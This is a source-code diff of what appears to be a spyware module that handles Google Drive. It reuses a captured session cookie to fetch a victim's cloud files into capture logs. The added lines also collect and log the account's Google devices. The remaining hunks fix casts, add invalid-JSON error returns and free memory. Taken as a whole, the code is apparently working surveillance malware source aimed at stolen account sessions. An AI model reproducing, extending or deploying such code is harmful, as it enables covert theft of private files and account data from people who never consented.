@@ -21,9 +21,17 @@ extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 
 extern BOOL Log_CopyCloudFile(PGD_FILE pFile, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag);
 
+extern DWORD GDev_GetDevices(LPSTR pszCookie);
+
+extern BOOL  g_bSendGoogleDevice;
+
 //google docs handler
 DWORD HandleGoogleDrive(LPSTR pszCookie)
 {
+	//get the google devices and save device a log
+	if(g_bSendGoogleDevice)
+		GDev_GetDevices(pszCookie);
+
 	if(!bPM_MailCapStarted)
 		return SOCIAL_REQUEST_SUCCESS;
 	
@@ -702,7 +710,7 @@ DWORD GD_GetFileTimestamp(JSONObject jFileObj)
 	if(iTime64 == -1)
 		return 0;
 
-	return iTime64;
+	return (DWORD)iTime64;
 }
 
 
@@ -807,6 +815,10 @@ DWORD GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimes
 		//if the file is a google document, append the extension according to file type
 		if(GD_IsGoogleDoc(FileType))
 			GD_AddFileExtension(&pNewFile->pwszFileName, FileType);
+	}
+	else
+	{
+		return GD_E_INVALID_JSON_DATA;
 	}
 
 	//file timestamp
@@ -985,16 +997,24 @@ DWORD GD_GetFile(PGD_FILE pFile,  PGD_PARAMS pParams, LPSTR pszCookie)
 
 						if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize != pFile->dwFileSize))
 						{
+							delete jValue;
 							znfree(&pszRecvBuf);
 							return GD_E_HTTP;
 						}				
 					}
 				}
 			}
+		}
+		else
+		{
+			znfree(&pwszURI);
+			znfree(&pwszHost);
+			znfree(&pwszHeader);
+			return GD_E_INVALID_JSON_DATA;
+		}
 
-			//delete json struct
-			delete jValue;
-		}		
+		//delete json struct
+		delete jValue;
 	}
 
 	znfree(&pwszURI);
